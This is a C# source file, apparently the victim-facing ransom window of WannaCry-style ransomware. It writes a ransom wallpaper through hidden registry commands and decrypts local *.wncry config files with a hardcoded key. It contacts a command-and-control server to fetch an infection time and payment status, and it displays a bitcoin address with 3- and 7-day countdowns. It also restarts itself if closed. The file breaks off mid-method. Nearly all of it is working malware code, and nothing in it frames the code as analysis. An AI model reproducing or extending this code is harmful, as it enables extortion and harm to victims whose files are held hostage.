using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;

namespace WannaDecryptor
{
    /// <summary>
    /// MainWindow.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class MainWindow : Window
    {
        private static string WANNACRY_MAIN_SERVER_IP = "";
        private static string WANNACRY_MAIN_SERVER_PORT = "";
        private static string WANNACRY_MAIN_SERVER_SSL_KEY = "";
        private static string WANNACRY_MAIN_SERVER_CLIENT_ID = "";
        private static string WANNACRY_MAIN_SERVER_RSA_PUBKEY = "";
        private static string WANNACRY_TIMER_PWBRO_TIME = "";
        private static string WANNACRY_TIMER_YFWBLO_TIME = "";
        private static string WANNACRY_BITCOIN_ADDRESS = "1EsFWAEu64mN8v35f6fFhk189eiGJoTLjQ";
        private static string WANNACRY_CLIENT_DATA_TIME = "";
        private static string WANNACRY_FILE_CLIENT_ID_DATA = "";
        private static string WANNACRY_MAIN_SERVER_INFO_URL = "";
        private static string WANNACRY_MAIN_SERVER_IP_AES_KEY = "";
        private static string WANNACRY_MAIN_SERVER_PORT_AES_KEY = "";
        private static string WANNACRY_FREE_DECRYPT_FILE_KEY = "";
        private static string WANNACRY_FILE_ENCRYPTION_PATH = "";
        private static bool WANNACRY_FREE_DECRYPT_CHECK_TOF = false;
        private static bool WANNACRY_TIMER_PWBRO_TIME_END_CHECK_TOF = false;
        private static bool WANNACRY_TIMER_YFWBLO_TIME_END_CHECK_TOF = false;
        private static bool WANNACRY_RESTART_PROGRAM_CHECK_TOF = true;
        private static bool WANNACRY_CLIENT_DATA_CHECK_PAYMENT = false;
        private static DateTime WANNACRY_CLIENT_DATA_TIME_DATE_TIME;
        private static List<string> WANNACRY_MESSAGE_BASE64_PATH = new List<string>();
        private static List<string> WANNACRY_FREE_DECRYPT_FILE_LIST = new List<string>();

        private static readonly string WANNACRY_FILE_DECRYPTOR_INFO_NAME = "b.wncry";
        private static readonly string WANNACRY_FILE_DECRYPTOR_INFO_KEY = "GLD34QaGHRdsR2ws";
        private static readonly string WANNACRY_FILE_CLIENT_ID_NAME = "c.wncry";
        private static readonly string WANNACRY_FILE_CLIENT_ID_KEY = "GLD34QaGHRdsR2ws";
        private static readonly string WANNACRY_FILE_MESSAGE_INFO_NAME = "r.wncry";
        private static readonly string WANNACRY_FILE_MESSAGE_INFO_KEY = "GLD34QaGHRdsR2ws";
        private static readonly string WANNACRY_FILE_FREE_DECRYPT_NAME = "s.wncry";
        private static readonly string WANNACRY_FILE_FREE_DECRYPT_KEY = "GLD34QaGHRdsR2ws";
        private static readonly string WANNACRY_FILE_ENCRYPTION_PATH_NAME = "p.wncry";
        private static readonly string WANNACRY_FILE_ENCRYPTION_PATH_KEY = "GLD34QaGHRdsR2ws";
        private static readonly string WANNACRY_FILE_ENCRYPTION_WALLPAPERS_NAME = "@WannaDecryptor@.png";
        public MainWindow()
        {
            Console.WriteLine(Client.AESEncrypt("2560", "GLD34QaGHRdsR2ws"));

            // Wallpapers change wannacry image
            Wallpapers_Image WANNACRY_IMAGE_BASE64 = new Wallpapers_Image();
            File.WriteAllBytes(WANNACRY_FILE_ENCRYPTION_WALLPAPERS_NAME, Convert.FromBase64String(WANNACRY_IMAGE_BASE64.base64_code));
            Thread WALLPAPERS_CHANGE = new Thread(delegate ()
            {
                for (int i = 0; i < 20; i++)
                {
                    string getImagePath = System.Environment.CurrentDirectory + "\\" + WANNACRY_FILE_ENCRYPTION_WALLPAPERS_NAME;
                    System.Diagnostics.ProcessStartInfo pri = new System.Diagnostics.ProcessStartInfo();
                    System.Diagnostics.Process pro = new System.Diagnostics.Process();
                    pri.FileName = "cmd.exe";
                    pri.CreateNoWindow = true;
                    pri.UseShellExecute = false;
                    pri.RedirectStandardInput = true;
                    pri.RedirectStandardOutput = true;
                    pri.RedirectStandardError = true;
                    pro.StartInfo = pri;
                    pro.Start();
                    pro.StandardInput.Write("reg add \"hkcu\\control panel\\desktop\" /v wallpaper /t REG_SZ /d \"" + getImagePath + "\" /f" + Environment.NewLine);
                    pro.StandardInput.Write("reg add \"hkcu\\control panel\\desktop\" /v WallpaperStyle /t REG_SZ /d 0 /f" + Environment.NewLine);
                    pro.StandardInput.Write("RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters ,1 ,True" + Environment.NewLine);
                    pro.StandardInput.Close();
                    string resultValue = pro.StandardOutput.ReadToEnd();
                    pro.WaitForExit();
                    pro.Close();
                }
            });
            WALLPAPERS_CHANGE.Start();

            // Read encryption path file - p.wncry
            try
            {
                WANNACRY_FILE_ENCRYPTION_PATH = Client.AESDecrypt(File.ReadAllText(WANNACRY_FILE_ENCRYPTION_PATH_NAME), WANNACRY_FILE_ENCRYPTION_PATH_KEY);
            }
            catch (Exception) { WANNACRY_RESTART_PROGRAM_CHECK_TOF = false; Environment.Exit(0); }

            // Read free decrypt list file - s.wncry
            try
            {
                string TEMP_FREE_DECRYPT = Client.AESDecrypt(File.ReadAllText(WANNACRY_FILE_FREE_DECRYPT_NAME), WANNACRY_FILE_FREE_DECRYPT_KEY);
                string[] TEMP_FREE_DECRYPT_SPLIT = TEMP_FREE_DECRYPT.Split('|');
                string[] TEMP_FREE_DECRYPT_SPLIT_SUB = TEMP_FREE_DECRYPT_SPLIT[0].Split(':');
                foreach (string TEMP_FREE_DECRYPT_SUB in TEMP_FREE_DECRYPT_SPLIT_SUB)
                {
                    try
                    {
                        var plainTextBytes = System.Convert.FromBase64String(TEMP_FREE_DECRYPT_SUB);
                        string base64_decode = System.Text.Encoding.UTF8.GetString(plainTextBytes);
                        WANNACRY_FREE_DECRYPT_FILE_LIST.Add(base64_decode);
                    }
                    catch (Exception) { }
                }
                var plainText = System.Convert.FromBase64String(TEMP_FREE_DECRYPT_SPLIT[1]);
                string base64_d_s = System.Text.Encoding.UTF8.GetString(plainText);
                WANNACRY_FREE_DECRYPT_FILE_KEY = base64_d_s;
                plainText = System.Convert.FromBase64String(TEMP_FREE_DECRYPT_SPLIT[2]);
                base64_d_s = System.Text.Encoding.UTF8.GetString(plainText);
                if (base64_d_s.ToLower().Equals("true")) WANNACRY_FREE_DECRYPT_CHECK_TOF = true;
                else WANNACRY_FREE_DECRYPT_CHECK_TOF = false;
            }
            catch (Exception) { WANNACRY_FREE_DECRYPT_CHECK_TOF = true; }

            // Read message info file - r.wncry
            try
            {
                if (new FileInfo(WANNACRY_FILE_MESSAGE_INFO_NAME).Exists)
                {
                    string TEMP_MESSAGE_INFO_FILE = File.ReadAllText(WANNACRY_FILE_MESSAGE_INFO_NAME);
                    if (TEMP_MESSAGE_INFO_FILE.Contains("&"))
                    {
                        string[] TEMP_MESSAGE_INFO_SPLIT = TEMP_MESSAGE_INFO_FILE.Split('&');
                        foreach (string GET_MESSAGE_PATH in TEMP_MESSAGE_INFO_SPLIT)
                            WANNACRY_MESSAGE_BASE64_PATH.Add(Client.AESDecrypt(GET_MESSAGE_PATH, WANNACRY_FILE_MESSAGE_INFO_KEY));
                        
                    }
                    else
                    {
                        WANNACRY_MESSAGE_BASE64_PATH.Add(Client.AESDecrypt(TEMP_MESSAGE_INFO_FILE, WANNACRY_FILE_MESSAGE_INFO_KEY));
                    }
                }
            }
            catch (Exception) {}

            // Read decryptor info file - b.wncry
            try
            {
                string TEMP_DECRYPTOR_INFO_FILE = Client.AESDecrypt(File.ReadAllText(WANNACRY_FILE_DECRYPTOR_INFO_NAME), WANNACRY_FILE_DECRYPTOR_INFO_KEY);
                WANNACRY_MAIN_SERVER_INFO_URL = TEMP_DECRYPTOR_INFO_FILE.Split('+')[0];
                WANNACRY_MAIN_SERVER_IP_AES_KEY = TEMP_DECRYPTOR_INFO_FILE.Split('+')[1];
                WANNACRY_MAIN_SERVER_PORT_AES_KEY = TEMP_DECRYPTOR_INFO_FILE.Split('+')[2];
            }
            catch (Exception) { WANNACRY_RESTART_PROGRAM_CHECK_TOF = false; Environment.Exit(0); }

            // Server info setting
            Dictionary<string, string> get_server_info = Client.server_info(
                WANNACRY_MAIN_SERVER_INFO_URL,
                WANNACRY_MAIN_SERVER_IP_AES_KEY,
                WANNACRY_MAIN_SERVER_PORT_AES_KEY);
            WANNACRY_MAIN_SERVER_IP = get_server_info["IP"];
            WANNACRY_MAIN_SERVER_PORT = get_server_info["PORT"];
            WANNACRY_MAIN_SERVER_SSL_KEY = Client.Randomtext(15);
            // Server info checker
            if (WANNACRY_MAIN_SERVER_IP == null || WANNACRY_MAIN_SERVER_PORT == null)
            {
                // Decryptor exit
                MessageBox.Show("The server IP or support port value for accessing the WannaCry C&C server is null.Please try in a momentarily.", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Error);
                WANNACRY_RESTART_PROGRAM_CHECK_TOF = false;
                Environment.Exit(0);
            }

            // Read client id file - c.wncry
            try
            {
                WANNACRY_FILE_CLIENT_ID_DATA = Client.AESDecrypt(
                    File.ReadAllText(WANNACRY_FILE_CLIENT_ID_NAME).Split(':')[0],
                    WANNACRY_FILE_CLIENT_ID_KEY);
                WANNACRY_MAIN_SERVER_RSA_PUBKEY = Client.AESDecrypt(
                    File.ReadAllText(WANNACRY_FILE_CLIENT_ID_NAME).Split(':')[1],
                    WANNACRY_FILE_CLIENT_ID_KEY);
                WANNACRY_MAIN_SERVER_CLIENT_ID = WANNACRY_FILE_CLIENT_ID_DATA;
            }
            catch (Exception)
            {
                // Decryptor exit
                MessageBox.Show("The 'c.wncry' file cannot be read or the value is invalid.Please restore the file again if you have changed it.", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Error);
                WANNACRY_RESTART_PROGRAM_CHECK_TOF = false;
                Environment.Exit(0);
            }

            // RSA key setting command send
            string RSA_KEY_SETTING_COMMAND = "[RSA]" + Client.RSAEncrypt(
                WANNACRY_MAIN_SERVER_CLIENT_ID + "&" + WANNACRY_MAIN_SERVER_SSL_KEY,
                WANNACRY_MAIN_SERVER_RSA_PUBKEY);
            try
            {
                string RSA_KEY_SETTING_RESULT = Client.Connection(WANNACRY_MAIN_SERVER_IP, int.Parse(WANNACRY_MAIN_SERVER_PORT), RSA_KEY_SETTING_COMMAND);
                if (RSA_KEY_SETTING_RESULT == null)
                {
                    // Decryptor exit
                    MessageBox.Show("Error connecting to WannaCry C&C server. Please try again in a momentarily.", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Error);
                    WANNACRY_RESTART_PROGRAM_CHECK_TOF = false;
                    Environment.Exit(0);
                }
                // Get Time
                WANNACRY_CLIENT_DATA_TIME = Client.Connection(
                    WANNACRY_MAIN_SERVER_IP,
                    int.Parse(WANNACRY_MAIN_SERVER_PORT),
                        "[AES]" +
                        Client.AESEncrypt(
                            "GET_TIME",
                            WANNACRY_MAIN_SERVER_SSL_KEY) + 
                        "&" + WANNACRY_MAIN_SERVER_CLIENT_ID);
                // Client id check
                if (WANNACRY_CLIENT_DATA_TIME.Equals("NOT_FOUND_CLIENT_ID") || WANNACRY_CLIENT_DATA_TIME.Equals("EXCEPTION") || WANNACRY_CLIENT_DATA_TIME == null)
                {
                    WANNACRY_RESTART_PROGRAM_CHECK_TOF = false;
                    Environment.Exit(0);
                }

                WANNACRY_CLIENT_DATA_TIME_DATE_TIME = Convert.ToDateTime(
                    WANNACRY_CLIENT_DATA_TIME.Split('_')[0].Replace("/", "-") 
                    + " " +
                    WANNACRY_CLIENT_DATA_TIME.Split('_')[1].Replace("/", ":"));
                WANNACRY_TIMER_PWBRO_TIME = WANNACRY_CLIENT_DATA_TIME_DATE_TIME.AddDays(3).ToString("yyyy/MM/dd HH:mm:ss");
                WANNACRY_TIMER_YFWBLO_TIME = WANNACRY_CLIENT_DATA_TIME_DATE_TIME.AddDays(7).ToString("yyyy/MM/dd HH:mm:ss");
                // Get Check_Payment True or False
                string WANNACRY_CLIENT_DATA_CHECK_PAYMENT_TEMP = Client.Connection(
                    WANNACRY_MAIN_SERVER_IP,
                    int.Parse(WANNACRY_MAIN_SERVER_PORT),
                        "[AES]" +
                        Client.AESEncrypt(
                            "CHECK_PAYMENT",
                            WANNACRY_MAIN_SERVER_SSL_KEY) +
                        "&" + WANNACRY_MAIN_SERVER_CLIENT_ID);
                // Client id check
                if (WANNACRY_CLIENT_DATA_CHECK_PAYMENT_TEMP.Equals("NOT_FOUND_CLIENT_ID") || WANNACRY_CLIENT_DATA_CHECK_PAYMENT_TEMP.Equals("EXCEPTION") || WANNACRY_CLIENT_DATA_CHECK_PAYMENT_TEMP == null)
                {
                    WANNACRY_RESTART_PROGRAM_CHECK_TOF = false;
                    Environment.Exit(0);
                }
                // Timer start and stop check
                if (WANNACRY_CLIENT_DATA_CHECK_PAYMENT_TEMP.ToLower().Equals("true"))
                {
                    WANNACRY_CLIENT_DATA_CHECK_PAYMENT = true;
                    WANNACRY_RESTART_PROGRAM_CHECK_TOF = false;
                }
                else
                {
                    WANNACRY_CLIENT_DATA_CHECK_PAYMENT = false;
                }
                string TIMER_CHECKER_NOW_TEMP = DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss");
                DateTime TIMER_CHECKER_NOW = Convert.ToDateTime(TIMER_CHECKER_NOW_TEMP);
                DateTime TIMER_CHECKER_PWBRO = Convert.ToDateTime(WANNACRY_TIMER_PWBRO_TIME);
                DateTime TIMER_CHECKER_YFWBLO = Convert.ToDateTime(WANNACRY_TIMER_YFWBLO_TIME);
                int TIMER_CHECKER_RESULT_1 = DateTime.Compare(TIMER_CHECKER_PWBRO, TIMER_CHECKER_NOW);
                int TIMER_CHECKER_RESULT_2 = DateTime.Compare(TIMER_CHECKER_YFWBLO, TIMER_CHECKER_NOW);
                if (TIMER_CHECKER_RESULT_1 > 0)
                    WANNACRY_TIMER_PWBRO_TIME_END_CHECK_TOF = false;
                else
                    WANNACRY_TIMER_PWBRO_TIME_END_CHECK_TOF = true;
                if (TIMER_CHECKER_RESULT_2 > 0)
                    WANNACRY_TIMER_YFWBLO_TIME_END_CHECK_TOF = false;
                else
                    WANNACRY_TIMER_YFWBLO_TIME_END_CHECK_TOF = true;
            }
            catch (Exception)
            {
                // Decryptor exit
                MessageBox.Show("Error connecting to WannaCry C&C server. Please try again in a momentarily.", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Error);
                WANNACRY_RESTART_PROGRAM_CHECK_TOF = false;
                Environment.Exit(0);
            }
            InitializeComponent();
        }

        private void MainStart(object sender, RoutedEventArgs e)
        {
            try
            {
                // Bitcoin address setting
                BitcoinAddress.Content = WANNACRY_BITCOIN_ADDRESS;
                // Setting PWBRO, YFWBLO DateTime
                // PWBRO
                Date1.Content = WANNACRY_TIMER_PWBRO_TIME;
                Date2.Content = WANNACRY_TIMER_YFWBLO_TIME;
                DateTime TimeAuc_Now = Convert.ToDateTime(DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"));
                DateTime TimeAuc_1 = Convert.ToDateTime(WANNACRY_TIMER_PWBRO_TIME);
                TimeSpan TimeAuc_2 = TimeAuc_1 - TimeAuc_Now;
                string WANNACRY_TIMER_PWBRO_TIME_DAYS = TimeAuc_2.Days.ToString();
                string WANNACRY_TIMER_PWBRO_TIME_HOURS = TimeAuc_2.Hours.ToString();
                string WANNACRY_TIMER_PWBRO_TIME_MINUTES = TimeAuc_2.Minutes.ToString();
                string WANNACRY_TIMER_PWBRO_TIME_SECONDS = TimeAuc_2.Seconds.ToString();
                int TEMP_PWBRO_DAYS_TO_SEC = TimeAuc_2.Days * 24 * 60 * 60;
                int TEMP_PWBRO_HOU_TO_SEC = TimeAuc_2.Hours * 60 * 60;
                int TEMP_PWBRO_MIN_TO_SEC = TimeAuc_2.Minutes * 60;
                int TEMP_PWBRO_ALL_SEC = TEMP_PWBRO_DAYS_TO_SEC +
                                         TEMP_PWBRO_HOU_TO_SEC +
                                         TEMP_PWBRO_MIN_TO_SEC +
                                         TimeAuc_2.Seconds;
                if (WANNACRY_TIMER_PWBRO_TIME_DAYS.Length == 1)
                    WANNACRY_TIMER_PWBRO_TIME_DAYS = "0" + WANNACRY_TIMER_PWBRO_TIME_DAYS;
                if (WANNACRY_TIMER_PWBRO_TIME_HOURS.Length == 1)
                    WANNACRY_TIMER_PWBRO_TIME_HOURS = "0" + WANNACRY_TIMER_PWBRO_TIME_HOURS;
                if (WANNACRY_TIMER_PWBRO_TIME_MINUTES.Length == 1)
                    WANNACRY_TIMER_PWBRO_TIME_MINUTES = "0" + WANNACRY_TIMER_PWBRO_TIME_MINUTES;
                if (WANNACRY_TIMER_PWBRO_TIME_SECONDS.Length == 1)
                    WANNACRY_TIMER_PWBRO_TIME_SECONDS = "0" + WANNACRY_TIMER_PWBRO_TIME_SECONDS;
                string PWBRO_TIMER_TIME = WANNACRY_TIMER_PWBRO_TIME_DAYS + ":" + WANNACRY_TIMER_PWBRO_TIME_HOURS + ":" + WANNACRY_TIMER_PWBRO_TIME_MINUTES + ":" + WANNACRY_TIMER_PWBRO_TIME_SECONDS;
                TimeAuc_1 = Convert.ToDateTime(WANNACRY_TIMER_YFWBLO_TIME);
                TimeAuc_2 = TimeAuc_1 - TimeAuc_Now;
                // YFWBLO
                string WANNACRY_TIMER_YFWBLO_TIME_DAYS = TimeAuc_2.Days.ToString();
                string WANNACRY_TIMER_YFWBLO_TIME_HOURS = TimeAuc_2.Hours.ToString();
                string WANNACRY_TIMER_YFWBLO_TIME_MINUTES = TimeAuc_2.Minutes.ToString();
                string WANNACRY_TIMER_YFWBLO_TIME_SECONDS = TimeAuc_2.Seconds.ToString();
                int TEMP_YFWBLO_DAYS_TO_SEC = TimeAuc_2.Days * 24 * 60 * 60;
                int TEMP_YFWBLO_HOU_TO_SEC = TimeAuc_2.Hours * 60 * 60;
                int TEMP_YFWBLO_MIN_TO_SEC = TimeAuc_2.Minutes * 60;
                int TEMP_YFWBLO_ALL_SEC = TEMP_YFWBLO_DAYS_TO_SEC +
                                         TEMP_YFWBLO_HOU_TO_SEC +
                                         TEMP_YFWBLO_MIN_TO_SEC +
                                         TimeAuc_2.Seconds;
                if (WANNACRY_TIMER_YFWBLO_TIME_DAYS.Length == 1)
                    WANNACRY_TIMER_YFWBLO_TIME_DAYS = "0" + WANNACRY_TIMER_YFWBLO_TIME_DAYS;
                if (WANNACRY_TIMER_YFWBLO_TIME_HOURS.Length == 1)
                    WANNACRY_TIMER_YFWBLO_TIME_HOURS = "0" + WANNACRY_TIMER_YFWBLO_TIME_HOURS;
                if (WANNACRY_TIMER_YFWBLO_TIME_MINUTES.Length == 1)
                    WANNACRY_TIMER_YFWBLO_TIME_MINUTES = "0" + WANNACRY_TIMER_YFWBLO_TIME_MINUTES;
                if (WANNACRY_TIMER_YFWBLO_TIME_SECONDS.Length == 1)
                    WANNACRY_TIMER_YFWBLO_TIME_SECONDS = "0" + WANNACRY_TIMER_YFWBLO_TIME_SECONDS;
                string YFWBLO_TIMER_TIME = WANNACRY_TIMER_YFWBLO_TIME_DAYS + ":" + WANNACRY_TIMER_YFWBLO_TIME_HOURS + ":" + WANNACRY_TIMER_YFWBLO_TIME_MINUTES + ":" + WANNACRY_TIMER_YFWBLO_TIME_SECONDS;

                // Set time
                if (!WANNACRY_TIMER_PWBRO_TIME_END_CHECK_TOF) { Timer1.Content = PWBRO_TIMER_TIME; ProgressBar1.Value = TEMP_PWBRO_ALL_SEC; }
                if (!WANNACRY_TIMER_YFWBLO_TIME_END_CHECK_TOF) { Timer2.Content = YFWBLO_TIMER_TIME; ProgressBar2.Value = TEMP_YFWBLO_ALL_SEC; }
                // Timer Setting
                if (!WANNACRY_CLIENT_DATA_CHECK_PAYMENT && !WANNACRY_TIMER_YFWBLO_TIME_END_CHECK_TOF)
                {
                    Thread timer = new Thread(delegate ()
                    {
                        while (true)
                        {
                            try
                            {
                                // Timer stop check
                                if (WANNACRY_TIMER_YFWBLO_TIME_END_CHECK_TOF) break;
                                if (WANNACRY_CLIENT_DATA_CHECK_PAYMENT) break;
                                // Thread 1 seconds
                                Thread.Sleep(1000);
                                // Timer - PWBRO
                                string[] split = PWBRO_TIMER_TIME.Split(':');
                                int now_timer_day = int.Parse(split[0]);
                                int now_timer_hou = int.Parse(split[1]);
                                int now_timer_min = int.Parse(split[2]);
                                int now_timer_sec = int.Parse(split[3]);
                                int next_timer_day = now_timer_day;
                                int next_timer_hou = now_timer_hou;
                                int next_timer_min = now_timer_min;
                                int next_timer_sec = now_timer_sec;
                                if (!WANNACRY_TIMER_PWBRO_TIME_END_CHECK_TOF)
                                {
                                    if (now_timer_sec == 0)
                                    {
                                        if (now_timer_min == 0)
                                        {
                                            if (now_timer_hou == 0)
                                            {
                                                if (now_timer_day == 0)
                                                {
                                                    WANNACRY_TIMER_PWBRO_TIME_END_CHECK_TOF = true;
                                                    next_timer_day = 0;
                                                    next_timer_hou = 0;
                                                    next_timer_min = 0;
                                                    next_timer_sec = 0;
                                                }
                                                else
                                                {
                                                    next_timer_day = now_timer_day - 1;
                                                    next_timer_hou = 23;
                                                    next_timer_min = 59;
                                                    next_timer_sec = 59;
                                                }
                                            }
                                            else
                                            {
                                                next_timer_hou = now_timer_hou - 1;
                                                next_timer_min = 59;
                                                next_timer_sec = 59;
                                            }
                                        }
                                        else
                                        {
                                            next_timer_min = now_timer_min - 1;
                                            next_timer_sec = 59;
                                        }
                                    }
                                    else
                                    {
                                        next_timer_sec = now_timer_sec - 1;
                                    }
                                }
                                else
                                {
                                    next_timer_day = 0;
                                    next_timer_hou = 0;
                                    next_timer_min = 0;
                                    next_timer_sec = 0;
                                }
                                WANNACRY_TIMER_PWBRO_TIME_DAYS = next_timer_day.ToString();
                                WANNACRY_TIMER_PWBRO_TIME_HOURS = next_timer_hou.ToString();
                                WANNACRY_TIMER_PWBRO_TIME_MINUTES = next_timer_min.ToString();
                                WANNACRY_TIMER_PWBRO_TIME_SECONDS = next_timer_sec.ToString();
                                if (WANNACRY_TIMER_PWBRO_TIME_DAYS.Length == 1)
                                    WANNACRY_TIMER_PWBRO_TIME_DAYS = "0" + WANNACRY_TIMER_PWBRO_TIME_DAYS;
                                if (WANNACRY_TIMER_PWBRO_TIME_HOURS.Length == 1)
                                    WANNACRY_TIMER_PWBRO_TIME_HOURS = "0" + WANNACRY_TIMER_PWBRO_TIME_HOURS;
                                if (WANNACRY_TIMER_PWBRO_TIME_MINUTES.Length == 1)
                                    WANNACRY_TIMER_PWBRO_TIME_MINUTES = "0" + WANNACRY_TIMER_PWBRO_TIME_MINUTES;
                                if (WANNACRY_TIMER_PWBRO_TIME_SECONDS.Length == 1)
                                    WANNACRY_TIMER_PWBRO_TIME_SECONDS = "0" + WANNACRY_TIMER_PWBRO_TIME_SECONDS;
                                PWBRO_TIMER_TIME = WANNACRY_TIMER_PWBRO_TIME_DAYS + ":" + WANNACRY_TIMER_PWBRO_TIME_HOURS + ":" + WANNACRY_TIMER_PWBRO_TIME_MINUTES + ":" + WANNACRY_TIMER_PWBRO_TIME_SECONDS;
                                // Timer - YFWBLO
                                split = YFWBLO_TIMER_TIME.Split(':');
                                now_timer_day = int.Parse(split[0]);
                                now_timer_hou = int.Parse(split[1]);
                                now_timer_min = int.Parse(split[2]);
                                now_timer_sec = int.Parse(split[3]);
                                next_timer_day = now_timer_day;
                                next_timer_hou = now_timer_hou;
                                next_timer_min = now_timer_min;
                                next_timer_sec = now_timer_sec;
                                if (!WANNACRY_TIMER_YFWBLO_TIME_END_CHECK_TOF)
                                {
                                    if (now_timer_sec == 0)
                                    {
                                        if (now_timer_min == 0)
                                        {
                                            if (now_timer_hou == 0)
                                            {
                                                if (now_timer_day == 0)
                                                {
                                                    WANNACRY_TIMER_YFWBLO_TIME_END_CHECK_TOF = true;
                                                    next_timer_day = 0;
                                                    next_timer_hou = 0;
                                                    next_timer_min = 0;
                                                    next_timer_sec = 0;
                                                }
                                                else
                                                {
                                                    next_timer_day = now_timer_day - 1;
                                                    next_timer_hou = 23;
                                                    next_timer_min = 59;
                                                    next_timer_sec = 59;
                                                }
                                            }
                                            else
                                            {
                                                next_timer_hou = now_timer_hou - 1;
                                                next_timer_min = 59;
                                                next_timer_sec = 59;
                                            }
                                        }
                                        else
                                        {
                                            next_timer_min = now_timer_min - 1;
                                            next_timer_sec = 59;
                                        }
                                    }
                                    else
                                    {
                                        next_timer_sec = now_timer_sec - 1;
                                    }
                                }
                                else
                                {
                                    next_timer_day = 0;
                                    next_timer_hou = 0;
                                    next_timer_min = 0;
                                    next_timer_sec = 0;
                                }
                                WANNACRY_TIMER_YFWBLO_TIME_DAYS = next_timer_day.ToString();
                                WANNACRY_TIMER_YFWBLO_TIME_HOURS = next_timer_hou.ToString();
                                WANNACRY_TIMER_YFWBLO_TIME_MINUTES = next_timer_min.ToString();
                                WANNACRY_TIMER_YFWBLO_TIME_SECONDS = next_timer_sec.ToString();
                                if (WANNACRY_TIMER_YFWBLO_TIME_DAYS.Length == 1)
                                    WANNACRY_TIMER_YFWBLO_TIME_DAYS = "0" + WANNACRY_TIMER_YFWBLO_TIME_DAYS;
                                if (WANNACRY_TIMER_YFWBLO_TIME_HOURS.Length == 1)
                                    WANNACRY_TIMER_YFWBLO_TIME_HOURS = "0" + WANNACRY_TIMER_YFWBLO_TIME_HOURS;
                                if (WANNACRY_TIMER_YFWBLO_TIME_MINUTES.Length == 1)
                                    WANNACRY_TIMER_YFWBLO_TIME_MINUTES = "0" + WANNACRY_TIMER_YFWBLO_TIME_MINUTES;
                                if (WANNACRY_TIMER_YFWBLO_TIME_SECONDS.Length == 1)
                                    WANNACRY_TIMER_YFWBLO_TIME_SECONDS = "0" + WANNACRY_TIMER_YFWBLO_TIME_SECONDS;
                                YFWBLO_TIMER_TIME = WANNACRY_TIMER_YFWBLO_TIME_DAYS + ":" + WANNACRY_TIMER_YFWBLO_TIME_HOURS + ":" + WANNACRY_TIMER_YFWBLO_TIME_MINUTES + ":" + WANNACRY_TIMER_YFWBLO_TIME_SECONDS;
                                // UI setting
                                this.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() =>
                                {
                                    if (!WANNACRY_TIMER_PWBRO_TIME_END_CHECK_TOF) Timer1.Content = PWBRO_TIMER_TIME;
                                    if (!WANNACRY_TIMER_YFWBLO_TIME_END_CHECK_TOF) Timer2.Content = YFWBLO_TIMER_TIME;
                                    if (!(ProgressBar1.Value <= 0) && !WANNACRY_TIMER_PWBRO_TIME_END_CHECK_TOF)
                                        ProgressBar1.Value = ProgressBar1.Value - 1;
                                    if (!(ProgressBar2.Value <= 0) && !WANNACRY_TIMER_YFWBLO_TIME_END_CHECK_TOF)
                                        ProgressBar2.Value = ProgressBar2.Value - 1;
                                }));
                            }
                            catch (Exception) { }
                        }
                    });
                    timer.Start();
                }
                // Return message
                Thread Return_Message = new Thread(delegate ()
                {
                    while (true)
                    {
                        Thread.Sleep(10000);
                        try
                        {
                            for (int READ_PATH_INDEX = 0; READ_PATH_INDEX < WANNACRY_MESSAGE_BASE64_PATH.Count; READ_PATH_INDEX++)
                            {
                                string Command_Result = Client.Connection(
                                    WANNACRY_MAIN_SERVER_IP,
                                    int.Parse(WANNACRY_MAIN_SERVER_PORT),
                                        "[AES]" +
                                        Client.AESEncrypt(
                                        "RETURN_MESSAGE" + "&" + WANNACRY_MESSAGE_BASE64_PATH[READ_PATH_INDEX],
                                        WANNACRY_MAIN_SERVER_SSL_KEY) +
                                        "&" + WANNACRY_MAIN_SERVER_CLIENT_ID);
                                if (!Command_Result.Equals("NOT_FOUND_MESSAGE_INFO") && !Command_Result.Equals("EXCEPTION") && !(Command_Result == null) && !Command_Result.Equals("<NULL>"))
                                {
                                    WANNACRY_MESSAGE_BASE64_PATH.Remove(WANNACRY_MESSAGE_BASE64_PATH[READ_PATH_INDEX]);
                                    string all_write = ""; string temp_write = "";
                                    foreach (string path in WANNACRY_MESSAGE_BASE64_PATH)
                                    {
                                        temp_write = Client.AESEncrypt(path, WANNACRY_FILE_MESSAGE_INFO_KEY);
                                        if (all_write.Equals("")) all_write = temp_write;
                                        else all_write = all_write + "&" + temp_write;
                                    }
                                    File.WriteAllText(WANNACRY_FILE_MESSAGE_INFO_NAME, all_write);
                                    this.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() =>
                                    {
                                        Show_Message SM = new Show_Message(Command_Result.Replace("&;E", "\r\n"));
                                        SM.ShowDialog();
                                    }));
                                }

                                Thread.Sleep(15000);
                            }
                        }
                        catch (Exception) {}
                    }
                });
                Return_Message.Start();
            }
            catch (Exception)
            {
                WANNACRY_RESTART_PROGRAM_CHECK_TOF = false;
                Environment.Exit(0);
            }
        }

        // Hyperlink URL open
        private void Hyperlink_RequestNavigate(object sender, System.Windows.Navigation.RequestNavigateEventArgs e)
        {
            try
            {
                System.Diagnostics.Process.Start(e.Uri.AbsoluteUri);
            }
            catch (Exception) { }
        }
        // Copy bitcoin address
        private void BitcoinAddress_Copy(object sender, RoutedEventArgs e)
        {
            try
            {
                Clipboard.SetText(WANNACRY_BITCOIN_ADDRESS);
            }
            catch (Exception) { }
        }
        // Restart this program
        private void Restart(object sender, EventArgs e)
        {
            if (WANNACRY_RESTART_PROGRAM_CHECK_TOF)
            {
                Thread.Sleep(15000);
                System.Diagnostics.Process.Start(Application.ResourceAssembly.Location);
                Environment.Exit(0);
            }
            else
            {
                Environment.Exit(0);
            }
        }
        // Send Message Event
        private void SendMessage(object sender, MouseButtonEventArgs e)
        {
            Contact_Us CU = new Contact_Us();
